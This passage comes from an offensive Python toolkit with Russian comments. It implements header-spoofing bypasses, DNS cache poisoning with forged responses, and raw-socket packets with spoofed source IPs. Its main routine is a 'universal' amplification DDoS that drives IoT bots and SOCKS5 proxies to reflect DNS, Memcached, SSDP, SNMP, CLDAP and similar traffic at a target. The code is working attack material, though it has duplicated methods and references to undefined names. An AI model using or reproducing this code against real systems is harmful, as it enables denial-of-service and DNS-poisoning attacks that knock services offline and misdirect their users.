        print(f"\n📊 Header Injection + XFF Spoofing результаты:")
        print(f"   Всего запросов: {attack_stats['requests_sent']}")
        print(f"   Успешных обходов: {attack_stats['successful_bypass']}")
        print(f"   Уникальных IP сспуфлено: {attack_stats['unique_ips_spoofed']}")
        print(f"   Эффективность: {(attack_stats['successful_bypass']/attack_stats['requests_sent']*100 if attack_stats['requests_sent'] > 0 else 0):.1f}%")
        
        return results

    def _generate_malicious_headers(self, attack_type):
        """Генерация поддельных заголовков для обхода защиты"""
        
        # Генерация поддельного IP
        def generate_spoofed_ip():
            ip_types = [
                # Private IPs
                f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                f"192.168.{random.randint(0,255)}.{random.randint(1,254)}",
                f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}",
                # Localhost variants
                "127.0.0.1", "localhost", "::1", "0.0.0.0",
                # Cloud internal
                "169.254.0.1", "169.254.1.1"
            ]
            ip = random.choice(ip_types)
            spoofed_ips.add(ip)
            return ip
        
        headers = {}
        
        if attack_type == 'direct_origin':
            # Прямой доступ к origin серверу
            headers.update({
                'Host': self._get_origin_server(),
                'X-Forwarded-Host': self._get_origin_server(),
                'X-Forwarded-For': generate_spoofed_ip(),
                'X-Real-IP': generate_spoofed_ip(),
                'X-Originating-IP': generate_spoofed_ip(),
                'Forwarded': f'for={generate_spoofed_ip()};proto=http;host={self._get_origin_server()}'
            })
        
        elif attack_type == 'internal_network':
            # Имитация запроса из внутренней сети
            headers.update({
                'Host': 'internal-api.example.com',
                'X-Forwarded-For': f"{generate_spoofed_ip()}, {generate_spoofed_ip()}, {generate_spoofed_ip()}",
                'X-Real-IP': generate_spoofed_ip(),
                'X-Client-IP': generate_spoofed_ip(),
                'X-Cluster-Client-IP': generate_spoofed_ip(),
                'Via': '1.1 internal-proxy'
            })
        
        elif attack_type == 'localhost':
            # Имитация локального запроса
            headers.update({
                'Host': 'localhost',
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
                'X-Forwarded-Host': 'localhost',
                'X-Forwarded-Proto': 'http'
            })
        
        elif attack_type == 'cloud_internal':
            # Имитация cloud internal traffic
            headers.update({
                'Host': 'metadata.google.internal',  # или aws equivalent
                'X-Forwarded-For': generate_spoofed_ip(),
                'X-Google-Real-IP': generate_spoofed_ip(),
                'X-AppEngine-City': 'Mountain View',
                'X-AppEngine-Country': 'US',
                'X-Cloud-Trace-Context': f"{random.getrandbits(128):032x}/0;o=1"
            })
        
        # Добавляем случайные заголовки для усложнения детекта
        additional_headers = {
            'X-Request-ID': str(uuid.uuid4()),
            'X-Correlation-ID': str(uuid.uuid4()),
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRF-Token': ''.join(random.choices('abcdef0123456789', k=32)),
            'User-Agent': random.choice([
                'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
                'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'
            ])
        }
        
        headers.update(additional_headers)
        return headers

    def _get_origin_server(self):
        """Получение origin сервера (можно расширить discovery)"""
        origin_servers = [
            'origin.example.com',
            'backend.example.com', 
            'api-backend.example.com',
            'direct.example.com',
            'internal.example.com',
            'app-server.example.com'
        ]
        return random.choice(origin_servers)

    def _send_malicious_request(self, target_ip, target_port, headers, device):
        """Отправка запроса с поддельными заголовками"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target_ip, target_port))
            
            # Строим HTTP запрос с поддельными заголовками
            request_lines = [f"GET / HTTP/1.1"]
            request_lines.append(f"Host: {headers.get('Host', target_ip)}")
            
            for key, value in headers.items():
                if key != 'Host':
                    request_lines.append(f"{key}: {value}")
            
            request_lines.extend(["", ""])  # Empty line to end headers
            request = "\r\n".join(request_lines)
            
            sock.send(request.encode())
            
            # Читаем ответ для проверки успешности
            response = sock.recv(4096).decode(errors='ignore')
            sock.close()
            
            # Проверяем успешность обхода
            success_indicators = [
                '200 OK',
                '301 Moved',
                '302 Found', 
                '403 Forbidden',  # Иногда доступно но запрещено
                'Server: nginx',
                'Server: apache',
                'X-Powered-By: PHP'
            ]
            
            return any(indicator in response for indicator in success_indicators)
            
        except Exception as e:
            return False

    def _create_dns_query(self, domain):
        """Создание DNS запроса"""
        import struct
        # Простой DNS запрос (QNAME format)
        query_id = random.randint(1, 65535)
        header = struct.pack('>HHHHHH', query_id, 0x0100, 1, 0, 0, 0)
        
        # QNAME: преобразование domain в DNS format
        qname = b''
        for part in domain.split('.'):
            qname += struct.pack('B', len(part)) + part.encode()
        qname += b'\x00'
        
        # QTYPE и QCLASS
        question = qname + struct.pack('>HH', 1, 1)  # A record, IN class
        
        return header + question

    def _send_spoofed_response(self, dns_server, domain, original_query):
        """Отправка поддельного DNS ответа"""
        try:
            # Создаем поддельный ответ с неправильным IP
            spoofed_ip = self._generate_fake_ip()
            
            # Парсим оригинальный запрос чтобы создать корректный ответ
            query_id = original_query[:2]
            
            # Создаем поддельный DNS ответ
            response = self._create_spoofed_dns_response(
                query_id=query_id,
                domain=domain,
                fake_ip=spoofed_ip,
                ttl=86400  # Долгий TTL (24 часа)
            )
            
            # Отправляем поддельный ответ на DNS сервер
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            sock.sendto(response, (dns_server, 53))
            sock.close()
            
            return True
            
        except Exception as e:
            print(f"❌ Ошибка отправки поддельного ответа: {e}")
            return False

    def _create_spoofed_dns_response(self, query_id, domain, fake_ip, ttl=86400):
        """Создание поддельного DNS ответа"""
        import struct
        import socket
        
        # Заголовок ответа
        flags = 0x8180  # QR=1 (response), AA=0, TC=0, RD=1, RA=1, Z=0, RCODE=0
        header = struct.pack('>HHHHHH', 
                             int.from_bytes(query_id, 'big'),  # ID
                             flags,        # Flags
                             1,            # QDCOUNT (1 question)
                             1,            # ANCOUNT (1 answer)  
                             0,            # NSCOUNT
                             0)            # ARCOUNT
        
        # Question section (такая же как в запросе)
        qname = b''
        for part in domain.split('.'):
            qname += struct.pack('B', len(part)) + part.encode()
        qname += b'\x00'
        
        question = qname + struct.pack('>HH', 1, 1)  # A record, IN class
        
        # Answer section
        # NAME (pointer to question)
        name = b'\xc0\x0c'  # Pointer to offset 12 (начало question)
        
        # TYPE, CLASS, TTL, RDLENGTH, RDATA
        answer = name + struct.pack('>HHIH', 
                                   1,       # TYPE A
                                   1,       # CLASS IN
                                   ttl,     # TTL (24 часа)
                                   4)       # RDLENGTH (IPv4 = 4 bytes)
        
        # IP address
        ip_packed = socket.inet_aton(fake_ip)
        answer += ip_packed
        
        return header + question + answer

    def _generate_fake_ip(self):
        """Генерация случайного фальшивого IP"""
        # Можно использовать:
        # - 127.0.0.1 (localhost)
        # - 0.0.0.0 (invalid)
        # - Случайные private IPs
        fake_ips = [
            '127.0.0.1',
            '0.0.0.0', 
            '10.0.0.1',
            '192.168.1.1',
            '172.16.0.1',
            '169.254.0.1'
        ]
        return random.choice(fake_ips)

    def _check_poison_success(self, dns_server, domain):
        """Проверка успешности отравления кеша"""
        try:
            import dns.resolver
            
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [dns_server]
            
            # Пытаемся резолвить домен
            answers = resolver.resolve(domain, 'A')
            
            # Если получили IP - проверяем не фальшивый ли он
            for answer in answers:
                if str(answer) in ['127.0.0.1', '0.0.0.0', '10.0.0.1', '192.168.1.1']:
                    return True  # Кеш отравлен!
                    
            return False
            
        except:
            return False

    def _create_spoofed_ip_packet(self, source_ip, dest_ip, protocol, data, source_port, dest_port):
        """Создает настоящий IP пакет с spoofed source IP"""
        
        # IP заголовок
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + len(data)  # IP header + data
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = protocol
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # IP заголовок без checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              ip_ihl_ver, ip_tos, ip_tot_len,
                              ip_id, ip_frag_off, ip_ttl, ip_proto,
                              ip_check, ip_saddr, ip_daddr)
        
        # Вычисляем IP checksum
        ip_check = self._calculate_checksum(ip_header)
        
        # Пересобираем с правильным checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              ip_ihl_ver, ip_tos, ip_tot_len,
                              ip_id, ip_frag_off, ip_ttl, ip_proto,
                              socket.htons(ip_check), ip_saddr, ip_daddr)
        
        return ip_header + data



    def _create_dns_any_query(self):
        """Создает DNS ANY запрос для amplification"""
        # Случайный ID транзакции
        transaction_id = struct.pack('!H', random.randint(0, 65535))
        
        # DNS заголовок: стандартный запрос
        flags = struct.pack('!H', 0x0100)  # Стандартный запрос
        questions = struct.pack('!H', 1)   # 1 вопрос
        answer_rrs = struct.pack('!H', 0)  # 0 ответов
        authority_rrs = struct.pack('!H', 0)  # 0 authority
        additional_rrs = struct.pack('!H', 0)  # 0 additional
        
        dns_header = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs
        
        # DNS вопрос: ANY запрос к крупному домену
        domains = ['google.com', 'youtube.com', 'facebook.com', 'amazon.com', 'microsoft.com']
        domain = random.choice(domains)
        
        # Кодируем домен
        qname = b''
        for part in domain.split('.'):
            qname += struct.pack('!B', len(part)) + part.encode()
        qname += b'\x00'  # Конец домена
        
        # QTYPE = ANY (255), QCLASS = IN (1)
        qtype = struct.pack('!H', 255)  # ANY запрос
        qclass = struct.pack('!H', 1)   # IN класс
        
        dns_question = qname + qtype + qclass
        
        return dns_header + dns_question

    def load_dns_amplifiers(self, filename="dnsip.txt"):
        """Загружает DNS сервера для amplification атаки"""
        amplifiers = []
        if not os.path.exists(filename):
            print(f"❌ Файл {filename} не найден!")
            return amplifiers
            
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            ip, port = line.split(':')
                            amplifiers.append((ip.strip(), int(port.strip())))
                        else:
                            amplifiers.append((line.strip(), 53))
            print(f"✅ Загружено {len(amplifiers)} DNS усилителей")
        except Exception as e:
            print(f"❌ Ошибка загрузки DNS усилителей: {e}")
        
        return amplifiers

    def load_memcached_amplifiers(self, filename="memcached.txt"):
        """Загружает Memcached сервера для amplification атаки"""
        amplifiers = []
        if not os.path.exists(filename):
            print(f"❌ Файл {filename} не найден!")
            return amplifiers
            
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            ip, port = line.split(':')
                            amplifiers.append((ip.strip(), int(port.strip())))
                        else:
                            amplifiers.append((line.strip(), 11211))  # default port
            print(f"✅ Загружено {len(amplifiers)} Memcached усилителей")
        except Exception as e:
            print(f"❌ Ошибка загрузки Memcached усилителей: {e}")
        
        return amplifiers

    def _create_memcached_stats_request(self):
        """Создает Memcached stats запрос для amplification"""
        # Команда stats с просьбой вернуть все статистики
        stats_command = b"stats\r\n"
        return stats_command

    def _create_memcached_get_request(self, key_count=100):
        """Создает Memcached GET запрос для amplification"""
        # Создаем множественные GET запросы
        get_commands = b""
        for i in range(key_count):
            key = f"key_{random.randint(1000, 9999)}_{i}".encode()
            get_commands += b"get " + key + b"\r\n"
        return get_commands

    def _create_proper_dns_any_query(self):
        """Создает правильный DNS ANY запрос"""
        # Transaction ID
        transaction_id = struct.pack('!H', random.randint(1, 65535))
        
        # Flags: Standard query + Recursion desired
        flags = struct.pack('!H', 0x0100)
        
        # Questions: 1
        questions = struct.pack('!H', 1)
        
        # Other sections: 0
        answer_rr = struct.pack('!H', 0)
        authority_rr = struct.pack('!H', 0)
        additional_rr = struct.pack('!H', 0)
        
        # Domain name (properly encoded)
        domain = random.choice(['google.com', 'cloudflare.com', 'akamai.net'])
        qname = b''
        for label in domain.split('.'):
            qname += bytes([len(label)]) + label.encode('ascii')
        qname += b'\x00'
        
        # Query type: ANY (255)
        qtype = struct.pack('!H', 255)
        
        # Query class: IN (1)
        qclass = struct.pack('!H', 1)
        
        return transaction_id + flags + questions + answer_rr + authority_rr + additional_rr + qname + qtype + qclass

    def _create_proper_ssdp_request(self):
        """Создает правильный SSDP M-SEARCH запрос"""
        ssdp_request = (
            "M-SEARCH * HTTP/1.1\r\n"
            "HOST: 239.255.255.250:1900\r\n"  # SSDP multicast address
            "MAN: \"ssdp:discover\"\r\n"
            "MX: 3\r\n"  # Maximum wait time
            "ST: ssdp:all\r\n"  # Search target
            "USER-AGENT: UPnP/1.0\r\n"
            "\r\n"
        )
        return ssdp_request.encode('utf-8')

    def _create_udp_packet(self, source_ip, source_port, dest_ip, dest_port, data):
        """Создает полный UDP пакет для raw socket"""
        # UDP header
        udp_length = 8 + len(data)
        udp_checksum = 0  # Можно установить 0 для упрощения
        
        udp_header = struct.pack('!HHHH', 
                               source_port, dest_port, 
                               udp_length, udp_checksum)
        
        # Pseudo header for checksum calculation (optional)
        return udp_header + data

    def _create_spoofed_udp_ip_packet(self, source_ip, dest_ip, source_port, dest_port, data):
        # Создать UDP header
        udp_length = 8 + len(data)
        udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, 0)
        
        # Создать IP header с spoofed source
        ip_header = self._create_ip_header(source_ip, dest_ip, udp_length, socket.IPPROTO_UDP)
        
        return ip_header + udp_header + data

    def amplification_ddos(self, target_ip, target_port=None, duration=60):
        """
        УНИВЕРСАЛЬНЫЙ Amplification DDoS атакующий все основные протоколы
        Автоматически определяет и использует все доступные amplification серверы
        """
        print(f"💥 ЗАПУСК УНИВЕРСАЛЬНОГО AMPLIFICATION DDoS НА {target_ip}")
        
        # Карта протоколов и портов для amplification
        amplification_protocols = {
            "53": "dns",
            "1900": "ssdp", 
            "5000": "ssdp", 
            "5001": "ssdp",
            "3702": "WS-Discovery",       # 50-150x усиление
            "5353": "mDNS",               # 2-50x усиление
            "161": "SNMP",                # 5-50x усиление
            "11211": "memcached",
            "389": "cldap",
            "443": "quic"
        }
        
        # Загружаем ВСЕ доступные amplification серверы
        all_amplifiers = {}
        
        # 1. Загружаем из основного файла
        main_amps = self.load_amplification_servers()
        for protocol, servers in main_amps.items():
            if servers:
                all_amplifiers[protocol] = servers
        
        # 2. Загружаем специализированные усилители
        specialized_amplifiers = {
            'DNS': self.load_dns_amplifiers(),
            'Memcached': self.load_memcached_amplifiers(),
            'QUIC': self.load_quic_amplifiers(),
            'SSDP': self.load_ssdp_amplifiers(),
        }
        
        for protocol, servers in specialized_amplifiers.items():
            if servers:
                all_amplifiers[protocol] = servers
                print(f"✅ Загружено {len(servers)} {protocol} усилителей")
        
        # 3. Создаем умный список протоколов для атаки
        available_protocols = []
        
        for port, protocol_name in AMPLIFICATION_PROTOCOLS.items():
            # Проверяем наличие серверов для этого протокола
            if protocol_name in all_amplifiers and all_amplifiers[protocol_name]:
                available_protocols.append((port, protocol_name, len(all_amplifiers[protocol_name])))
        
        if not available_protocols:
            print("❌ Нет доступных amplification серверов!")
            return 0
        
        # Сортируем протоколы по эффективности (количество серверов * коэффициент усиления)
        PROTOCOL_AMPLIFICATION_FACTORS = {
            'MEMCACHED': 10000,    # 10,000-50,000x ⭐
            'DNS': 100,            # 50-100x ⭐  
            'WS-DISCOVERY': 150,   # 50-150x ⭐
            'CLDAP': 60,           # 50-60x
            'SSDP': 40,            # 30-40x
            'SNMP': 50,            # 5-50x
            'M-DNS': 50,           # 2-50x
            'QUIC': 10,            # 5-10x
            'COAP': 20,            # 10-20x
        }
        
        available_protocols.sort(key=lambda x: protocol_effectiveness.get(x[1], 10) * x[2], reverse=True)
        
        print(f"🎯 ДОСТУПНЫЕ PROTOКОЛЫ AMPLIFICATION:")
        total_servers = 0
        for port, protocol, count in available_protocols:
            effectiveness = protocol_effectiveness.get(protocol, 10)
            print(f"   🔥 {protocol}:{port} - {count} серверов (~{effectiveness}x)")
            total_servers += count
        
        print(f"📡 ВСЕГО СЕРВЕРОВ: {total_servers}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 ИСПОЛЬЗУЕМ: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_requests': 0,
            'total_bytes_sent': 0,
            'estimated_amplified_bytes': 0,
            'failed_requests': 0,
            'protocol_stats': {protocol: 0 for protocol in all_amplifiers.keys()},
            'start_time': time.time(),
            'is_running': True
        }
        
        def universal_amplification_attack(device):
            requests_sent = 0
            bytes_sent = 0
            estimated_amplified_bytes = 0
            failed_requests = 0
            
            try:
                print(f"💥 {device.ip} начинает УНИВЕРСАЛЬНУЮ amplification атаку...")
                start_time = time.time()
                
                # Создаем raw socket для IP spoofing
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    raw_socket_available = True
                except PermissionError:
                    print(f"❌ {device.ip}: Требуются права root для IP spoofing!")
                    return 0, 0
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # ВЫБОР ПРОТОКОЛА: Умный выбор на основе эффективности и доступности
                        available_now = [(port, proto) for port, proto, count in available_protocols 
                                       if proto in all_amplifiers and all_amplifiers[proto]]
                        
                        if not available_now:
                            break
                        
                        # Взвешенный случайный выбор (предпочтение более эффективным протоколам)
                        weights = [protocol_effectiveness.get(proto, 10) for port, proto in available_now]
                        target_port, protocol = random.choices(available_now, weights=weights)[0]
                        
                        # Выбираем случайный сервер для этого протокола
                        server = random.choice(all_amplifiers[protocol])
                        server_ip = server[0] if isinstance(server, tuple) else server
                        server_port = server[1] if isinstance(server, tuple) else target_port
                        
                        # СОЗДАНИЕ AMPLIFICATION ПАКЕТА ДЛЯ ВЫБРАННОГО ПРОТОКОЛА
                        amp_packet = self._create_universal_amplification_packet(protocol, target_ip)
                        
                        if not amp_packet:
                            continue
                        
                        # СОЗДАНИЕ ПОЛНОГО UDP+IP ПАКЕТА
                        source_port = random.randint(1024, 65535)
                        ip_packet = self._create_spoofed_udp_ip_packet(
                            source_ip=target_ip,
                            dest_ip=server_ip,
                            source_port=source_port,
                            dest_port=server_port,
                            data=amp_packet
                        )
                        
                        # ОТПРАВКА ПАКЕТА
                        sock.sendto(ip_packet, (server_ip, 0))
                        
                        # РАСЧЕТ AMPLIFICATION
                        request_size = len(ip_packet)
                        amplification_factor = protocol_effectiveness.get(protocol, 10)
                        estimated_response_size = request_size * amplification_factor
                        
                        # ОБНОВЛЕНИЕ СТАТИСТИКИ
                        requests_sent += 1
                        bytes_sent += request_size
                        estimated_amplified_bytes += estimated_response_size
                        
                        attack_stats['total_requests'] += 1
                        attack_stats['total_bytes_sent'] += request_size
                        attack_stats['estimated_amplified_bytes'] += estimated_response_size
                        attack_stats['protocol_stats'][protocol] += 1
                        
                        # ДИНАМИЧЕСКАЯ ЗАДЕРЖКА для оптимизации скорости
                        delay_strategy = {
                            'Memcached': random.uniform(0.2, 0.5),
                            'DNS': random.uniform(0.05, 0.1),
                            'NTP': random.uniform(0.1, 0.2),
                            'WS-Discovery': random.uniform(0.08, 0.15),
                            'CLDAP': random.uniform(0.07, 0.12),
                            'SSDP': random.uniform(0.06, 0.1),
                            'SNMP': random.uniform(0.05, 0.08),
                            'QUIC': random.uniform(0.08, 0.12),
                        }
                        
                        time.sleep(delay_strategy.get(protocol, random.uniform(0.05, 0.1)))
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                sock.close()
                
                # ВЫВОД РЕЗУЛЬТАТОВ ДЛЯ УСТРОЙСТВА
                mb_sent = bytes_sent / 1024 / 1024
                mb_amplified = estimated_amplified_bytes / 1024 / 1024
                
                print(f"✅ {device.ip} завершил атаку:")
                print(f"   📦 Запросов: {requests_sent}")
                print(f"   📤 Отправлено: {mb_sent:.2f} МБ")
                print(f"   💥 Усиленный трафик: {mb_amplified:.2f} МБ")
                print(f"   📊 Эффективность: {mb_amplified/max(mb_sent, 0.001):.1f}x")
                
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Критическая ошибка у {device.ip}: {e}")
                return 0, 0
        
        # ЗАПУСК АТАКИ
        results = self._run_attack(all_active_bots, attack_stats, universal_amplification_attack, 
                                  "UNIVERSAL AMPLIFICATION")
        
        # ДЕТАЛЬНАЯ СТАТИСТИКА АТАКИ
        print(f"\n💥 РЕЗУЛЬТАТЫ УНИВЕРСАЛЬНОГО AMPLIFICATION DDoS:")
        print(f"🎯 ВСЕГО ЗАПРОСОВ: {attack_stats['total_requests']}")
        print(f"📤 ОТПРАВЛЕНО ДАННЫХ: {attack_stats['total_bytes_sent'] / 1024 / 1024:.2f} MB")
        print(f"💥 ОЦЕНКА УСИЛЕННОГО ТРАФИКА: {attack_stats['estimated_amplified_bytes'] / 1024 / 1024:.2f} MB")
        print(f"❌ ОШИБОК: {attack_stats['failed_requests']}")
        
        print(f"\n📊 СТАТИСТИКА ПО ПРОТОКОЛАМ:")
        for protocol, count in sorted(attack_stats['protocol_stats'].items(), key=lambda x: x[1], reverse=True):
            if count > 0:
                effectiveness = protocol_effectiveness.get(protocol, 10)
                print(f"   🔥 {protocol}: {count} запросов (~{effectiveness}x)")
        
        total_amplification = attack_stats['estimated_amplified_bytes'] / max(attack_stats['total_bytes_sent'], 1)
        print(f"\n🚀 ОБЩАЯ ЭФФЕКТИВНОСТЬ: {total_amplification:.1f}x УСИЛЕНИЯ")
        
        return results

    def _create_universal_amplification_packet(self, protocol, target_ip):
        """Создает amplification пакет для любого протокола"""
        try:
            protocol = protocol.upper()
            
            protocol_handlers = {
                'DNS': self._create_proper_dns_any_query,
                'SSDP': self._create_proper_ssdp_request,
                'WS-DISCOVERY': self._create_ws_discovery_request,
                'M-DNS': self._create_mdns_request,
                'SNMP': self._create_snmp_bulk_request,
                'MEMCACHED': self._create_memcached_stats_request,
                'CLDAP': self._create_cldap_search_request,
                'QUIC': self._create_quic_initial_packet,
                'COAP': self._create_coap_discovery_request,
            }
            
            handler = protocol_handlers.get(protocol)
            if handler:
                return handler()
            else:
                # Fallback для неизвестных протоколов
                return os.urandom(random.randint(50, 200))
                
        except Exception as e:
            print(f"❌ Ошибка создания {protocol} пакета: {e}")
            return None

    # ДОПОЛНИТЕЛЬНЫЕ МЕТОДЫ ДЛЯ НОВЫХ ПРОТОКОЛОВ

    def _create_proper_ssdp_request(self):
        """Создает SSDP M-SEARCH запрос для amplification"""
        ssdp_request = (
            "M-SEARCH * HTTP/1.1\r\n"
            "HOST: 239.255.255.250:1900\r\n"
            "MAN: \"ssdp:discover\"\r\n"
            "MX: 5\r\n"
            "ST: ssdp:all\r\n"
            "USER-AGENT: UPnP/1.1\r\n"
            "\r\n"
        )
        return ssdp_request.encode()

    def _create_ws_discovery_request(self):
        """Создает WS-Discovery запрос для amplification"""
        # WS-Discovery Probe message
        ws_discovery_probe = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" '
            'xmlns:wsa="http://www.w3.org/2005/08/addressing" '
            'xmlns:tns="http://docs.oasis-open.org/ws-dd/ns/discovery/2009/01">'
            '<soap:Header>'
            '<wsa:Action>http://docs.oasis-open.org/ws-dd/ns/discovery/2009/01/Probe</wsa:Action>'
            '<wsa:MessageID>urn:uuid:' + str(uuid.uuid4()) + '</wsa:MessageID>'
            '<wsa:To>urn:docs-oasis-open-org:ws-dd:ns:discovery:2009:01</wsa:To>'
            '</soap:Header>'
            '<soap:Body>'
            '<tns:Probe>'
            '<tns:Types>tns:NetworkVideoTransmitter</tns:Types>'
            '<tns:Scopes />'
            '</tns:Probe>'
            '</soap:Body>'
            '</soap:Envelope>'
        )
        return ws_discovery_probe.encode()

    def _create_mdns_request(self):
        """Создает mDNS запрос для amplification"""
        # mDNS query for all services
        mdns_query = (
            # Transaction ID
            b'\x00\x00' +
            # Flags (standard query)
            b'\x00\x00' +
            # Questions
            b'\x00\x01' +
            # Answer RRs
            b'\x00\x00' +
            # Authority RRs  
            b'\x00\x00' +
            # Additional RRs
            b'\x00\x00' +
            # Query: _services._dns-sd._udp.local
            b'\x09_services\x07_dns-sd\x04_udp\x05local\x00' +
            # Type PTR, Class IN
            b'\x00\x0c\x00\x01'
        )
        return mdns_query

    def _create_snmp_bulk_request(self):
        """Создает SNMP bulk request для amplification"""
        # SNMP version 2c bulk request for system information
        snmp_request = (
            b'\x30\x26\x02\x01\x01\x04\x06public\xa5\x19\x02\x01\x00\x02\x01\x00\x02\x01\x00' +
            b'\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00'
        )
        return snmp_request

    def _create_coap_discovery_request(self):
        """Создает CoAP discovery запрос для amplification"""
        # CoAP GET запрос для discovery .well-known/core
        coap_header = b'\x40\x01\x00\x00'  # Version 1, CON, GET, Message ID 0
        coap_token = b'\x00'  # Zero-length token
        coap_options = b'\xb0\x2c\x2e\x77\x65\x6c\x6c\x2d\x6b\x6e\x6f\x77\x6e\x2f\x63\x6f\x72\x65'  # URI-Path: .well-known/core
        coap_payload_marker = b'\xff'  # Payload marker
        
        return coap_header + coap_token + coap_options + coap_payload_marker

    def load_ntp_amplifiers(self, filename="ntp_servers.txt"):
        """Загружает NTP серверы для amplification"""
        amplifiers = []
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            amplifiers.append((line, 123))
            except Exception as e:
                print(f"❌ Ошибка загрузки NTP усилителей: {e}")
        return amplifiers


    def _create_snmp_bulk_request(self):
        """Создает SNMP bulk request для amplification"""
        # SNMP version 2c bulk request
        snmp_request = b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x01\x00\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00'
        return snmp_request

    def _create_chargen_request(self):
        """Создает CHARGEN запрос"""
        return b'\x00'  # Любой байт для CHARGEN

    def _create_rpc_request(self):
        """Создает RPC запрос"""
        return b'\x80\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'  # RPC call

    def _create_netbios_name_query(self):
        """Создает NetBIOS name query"""
        return b'\x80\xf0\x00\x10\x00\x01\x00\x00\x00\x00\x00\x00\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x21\x00\x01'

    def _create_mssql_resolution_request(self):
        """Создает MSSQL resolution request"""
        return b'\x03' + os.urandom(7)  # MSSQL resolution protocol

    def load_dns_amplifiers(self, attack_type):
        """Загружает DNS серверы для amplification по типам атаки"""
        amplifiers = []
        
        filename_map = {
            "any": "dns_any.txt",
            "dnskey": "dns_dnskey.txt", 
            "txt": "dns_txt.txt"
        }
        
        # Получаем имя файла для типа атаки
        filename = filename_map.get(attack_type, "dns.txt")
        
        # 🔥 ЗАГРУЖАЕМ ТОЛЬКО ИЗ СПЕЦИФИЧНОГО ФАЙЛА ДЛЯ ЭТОГО ТИПА
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    for line in f:
                        line = line.strip()
                        # Убираем комментарии из середины строки
                        if '#' in line:
                            line = line.split('#')[0].strip()
                        if line and not line.startswith('#'):
                            amplifiers.append((line, 53))
                
                if amplifiers:
                    print(f"✅ Загружено {len(amplifiers)} DNS усилителей из {filename}")
                else:
                    print(f"⚠️ Файл {filename} найден, но пустой")
                    
            except Exception as e:
                print(f"❌ Ошибка загрузки DNS усилителей из {filename}: {e}")
        else:
            print(f"⚠️ Файл {filename} не найден")
        
        return amplifiers

    # 🎯 КАЖДЫЙ МЕТОД РАБОТАЕТ ПОЛНОСТЬЮ НЕЗАВИСИМО
    def dns_any_attack(self, target, duration=30, num_threads=None):
        """DNS ANY amplification атака"""
        # ИСПРАВЛЕНИЕ: передаем target вместо target_ip
        return self.dns_amplification_attack(target, "any", duration, num_threads)

    def dns_dnskey_attack(self, target, duration=30, num_threads=None):
        """DNS DNSKEY amplification атака"""
        # ИСПРАВЛЕНИЕ: передаем target вместо target_ip
        return self.dns_amplification_attack(target, "dnskey", duration, num_threads)

    def dns_txt_attack(self, target, duration=30, num_threads=None):
        """DNS TXT amplification атака"""
        # ИСПРАВЛЕНИЕ: передаем target вместо target_ip
        return self.dns_amplification_attack(target, "txt", duration, num_threads)

    def dns_attack(self, target, duration=30, num_threads=None):
        """DNS amplification атака - запускает все доступные DNS атаки"""
        # Добавьте эти строки в начало метода:
        target_ip = self._get_target_ip(target)
        if not target_ip:
            return 0
        
        # Остальной код метода остается без изменений
        import os
        
        # 🔍 ПРОВЕРЯЕМ КАКИЕ ФАЙЛЫ ЕСТЬ
        available_attacks = []
        
        if os.path.exists("dns_any.txt"):
            available_attacks.append("ANY")
        
        if os.path.exists("dns_dnskey.txt"):
            available_attacks.append("DNSKEY")
        
        if os.path.exists("dns_txt.txt"):
            available_attacks.append("TXT")
        
        if not available_attacks:
            print("🚫 Нет доступных DNS атак! Создайте файлы:")
            print("   - dns_any.txt")
            print("   - dns_dnskey.txt") 
            print("   - dns_txt.txt")
            return 0
        
        print(f"✅ Доступные DNS атаки: {', '.join(available_attacks)}")
        
